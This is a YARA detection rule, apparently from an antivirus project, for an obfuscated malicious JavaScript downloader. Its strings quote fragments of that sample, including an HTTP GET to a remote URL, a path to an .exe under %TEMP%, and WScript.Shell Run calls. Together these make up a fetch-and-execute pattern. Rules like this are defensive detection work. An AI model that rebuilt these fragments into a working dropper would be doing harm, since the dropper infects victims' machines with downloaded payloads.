rule sig_20160329_7bdf8bb61c7a757282fdeca253fbe4e4 {
  meta:
    description = "datamaliciousorder - file 20160329_7bdf8bb61c7a757282fdeca253fbe4e4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5d2f4056b9f86cb4b42c94fb01d6fdcb214d84f5947b2ecf8b4a120f81d80093"

  strings:
    $s1  = "sM[DX](\"GET\", \"http://zilton.com/o9qwp\", false);" fullword ascii
    $s2  = "function CB() {return Yf[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"WEd0TqpTi7D.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[Ek](E() * 11); if (sM[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var Yf = function QZ() {return WScript[Tf](\"WScript.Shell\");}(), kY = 11;" fullword ascii
    $s5  = "function PD(hh, k0){zJ = zJ * 1; return hh - k0;};" fullword ascii
    $s6  = "function IT(){return \"\" + u;};" fullword ascii
    $s7  = "function Xv() {return ((A == true) && (A == N)) ? 1 : zJ;};" fullword ascii
    $s8  = "function FD(j){Yf[\"Run\"](j, zJ, zJ);};" fullword ascii
    $s9  = "function mj(oI) {var Qq = (1, 2, 3, 4, 5, oI); return Qq;};" fullword ascii
    $s10 = "function qg()" fullword ascii
    $s11 = "return PD(BX, s0);" fullword ascii
    $s12 = "function E(){return 22;};" fullword ascii
    $s13 = "var v = new this[\"Date\"]();" fullword ascii
    $s14 = " while (gg){" fullword ascii
    $s15 = "function Il(){return Tf;};" fullword ascii
    $s16 = "A = true; " fullword ascii
    $s17 = "N = true; " fullword ascii
    $s18 = "var FR = false;" fullword ascii
    $s19 = "} catch(UP){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}